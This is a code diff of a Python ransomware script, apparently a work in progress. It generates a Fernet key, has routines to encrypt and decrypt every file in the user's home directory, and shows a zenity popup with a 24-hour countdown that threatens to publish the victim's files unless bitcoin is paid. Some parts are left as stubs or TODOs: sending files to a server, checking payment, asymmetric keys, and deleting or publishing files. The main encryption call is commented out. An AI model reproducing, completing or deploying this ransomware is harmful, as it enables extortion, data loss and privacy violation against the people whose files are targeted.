@@ -1,7 +1,6 @@
 import os
 from os.path import expanduser
 from cryptography.fernet import Fernet
-import base64
 import subprocess
 import time
 import signal
@@ -9,11 +8,13 @@ import signal
 # Home directory
 home = expanduser("~")
 
-
-
+#TODO:
 def send_file_to_server(file_path):
     return
 
+#TODO:
+def check_if_user_has_paid():
+    return False
 
 def generate_key():
     if not os.path.isfile("./key.key"):
@@ -107,43 +108,58 @@ def decrypt_all_files(directory, key):
             decrypt_file(file_path, key)
 
 
-def display_popup(duration):
 
+#Main function/ control flow
+def main(duration):
 
-
-        start_time = time.time()
-        remaining_time = duration
-
-        while remaining_time > 0:
-                # Format the remaining time as minutes and seconds
-                minutes = int(remaining_time // 60)
-                seconds = int(remaining_time % 60)
-
-                        # Text to be displayed on the pop up
-                text = f"HAHAHAHA, all your files are encrypted and stored on our sever!\nIf you pay us in the next <b>{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\nIf you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
-                # Show the dialog with the remaining time, keep refreshing the window.
-                popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
-
-                # Update the remaining time
-                elapsed_time = time.time() - start_time
-                remaining_time = duration - elapsed_time
-                time.sleep(1)
-                popup.send_signal(signal.SIGTERM)
-
-
-
-def main():
+    #TODO: Replace this with Asymetric crypto
+    #Generate key and make a key file
     generate_key()
     with open("key.key", "rb") as key:
         key = key.read()
 
-    encrypt_and_send_all_files(home, key)
-    display_popup(1000000)
-    decrypt_all_files(home, key)
+
+    #Encrypt all files
+    # encrypt_and_send_all_files(home, key)
 
 
-# main()
+    #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
+    # again its still the same. Alternatively mayb we tell them not to close their computer?
+
+    start_time = time.time()
+    remaining_time = duration
+
+    while remaining_time > 0:
+            # Format the remaining time as hours, minutes and seconds
+            hours = int(remaining_time // 3600)
+            minutes = int((remaining_time%3600) // 60)
+            seconds = int(remaining_time % 60)
+
+            # Text to be displayed on the pop up
+            text = f"HAHAHAHA, all your files are encrypted and stored on our sever!\nIf you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\nIf you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
+
+            # Show the dialog with the remaining time, keep refreshing the window.
+            popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
+
+            # Update the remaining time
+            elapsed_time = time.time() - start_time
+            remaining_time = duration - elapsed_time
+            time.sleep(1)
+            popup.send_signal(signal.SIGTERM)
+
+            if (check_if_user_has_paid()):
+                break
 
 
-# print(list_safe_directories(directory))
-display_popup(1000)
+    #User has paid before the time ran out
+    if (check_if_user_has_paid()):
+        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been recieved! \n Decrypting all files.","--width", "400", "--height", "200" ])
+        # decrypt_all_files(home, key)
+        #TODO: Implement code to delete all the files that are stored on the server
+
+    else: # Timer has run out
+        #TODO: Implement file deletion and internet publication code.
+        return
+
+
+main(86400)
